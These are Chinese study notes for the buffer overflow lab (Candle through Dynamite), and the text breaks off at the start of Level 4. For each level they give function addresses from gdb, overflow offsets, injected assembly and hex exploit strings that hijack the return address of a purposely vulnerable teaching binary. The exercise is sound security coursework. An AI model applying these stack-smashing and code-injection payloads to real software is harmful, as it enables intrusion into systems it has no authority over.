# buffer lab学习笔记

这个lab的任务和attach_lab一样，也是要求通过栈溢出控制程序流程完成相应任务
## Level 0: Candle (10 pts)
令test函数调用完getbuf函数后执行smoke函数
smoke函数源代码
```
void smoke()
{
printf("Smoke!: You called smoke()\n");
validate(0);
exit(0);
}
```
使用gdb查看smoke函数的地址
```
pwndbg> p smoke
$1 = {<text variable, no debug info>} 0x8048c18 <smoke>
```
然后计算栈溢出偏移是44，能覆盖到eip
构建如下格式的十六进制字符完成题目要求
```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
18 8c 04 08
```

![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image1.png)

## Level 1: Sparkler (10 pts)
同level_0的要求，这次需要跳转到fizz函数内
fizz函数源码
```
void fizz(int val)
{
if (val == cookie) {
printf("Fizz!: You called fizz(0x%x)\n", val);
validate(1);
} else
printf("Misfire: You called fizz(0x%x)\n", val);
exit(0);
}
```
这里有个要求是需要让传参等于cookie，因为是32位的程序，所以是栈传参
并且在函数调用时先压入参数再压入返回地址，构造如下内容完成实验
```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
42 8c 04 08
00 00 00 00
b8 da 18 28
```

![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image2.png)

## Level 2: Firecracker (15 pts)
题目要求和上面的一样，跳转到bang函数上
查看bang函数源码
```
int global_value = 0;
void bang(int val)
{
if (global_value == cookie) {
printf("Bang!: You set global_value to 0x%x\n", global_value);
validate(2);
} else
printf("Misfire: global_value = 0x%x\n", global_value);
exit(0);
}
```
可以看到需要让全局变量global_value的值和cookie值相同，并且writeup中的提示让我们进行code-injection
与attack-lab的做法一样，通过注入代码后控制eip跳转到我们注入代码的位置
构造如下汇编代码令global_value的值等于cookie
```
mov    $0x2818dab8, %eax //eax = cookie
mov    %eax, 0x0804D100  //0x0804D100 --> [global_value_address] = cookie
push   $0x08048c9d       //bang_address
ret

```
使用gcc将其转变为
```
b8 b8 da 18 
28 89 04 25
00 d1 04 08 
68 9d 8c 04 
08 c3
```
通过gdb调试获得注入代码的位置
```
pwndbg> x/20gx $esp
0x556837c8 <_reserved+1038280>:	0xf7fb6404556837d8	0xbf153c007f87426a
0x556837d8 <_reserved+1038296>:	0x2504892818dab8b8	0x048c9d680804d100
0x556837e8 <_reserved+1038312>:	0x000000000000c308	0x0000000000000000
```
可以看到注入位置在0x556837d8处，然后我们就可以构造hex完成本题了
```
b8 b8 da 18 
28 89 04 25
00 d1 04 08 
68 9d 8c 04 
08 c3 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
d8 37 68 55
```

![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image3.png)

## Level 3: Dynamite (20 pts)
本题要求：
```
修改getbuf()返回值为对应cookie，而不是1；
恢复test函数中的%ebp寄存器内容；
返回到接下去test()函数执行位置正常执行。
```
因为函数的返回值是使用eax寄存器实现的，所以我们可以使用上一个实验的办法进行代码注入后修改eax中的值为cookie再跳转回test函数
而要保证不破坏栈的布局则需要不修改ebp的值，通过gdb获取ebp的值

![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image4.png)

使用与上一个实验同样的步骤将下面的汇编代码转为16进制字符串
```
mov   $0x2818dab8, %eax //eax = cookie
push  $0x8048dbe        //test_address
ret
```
```
b8 b8 da 18 
28 68 be 8d 
04 08 c3 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
30 38 68 55
d8 37 68 55
```

![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image5.png)

## Level 4: Nitroglycerin (10 pts)

题目要求与level_3一致，不过比起level_3难度上升了一些
使用-n参数使程序调用testn和getbufn函数，


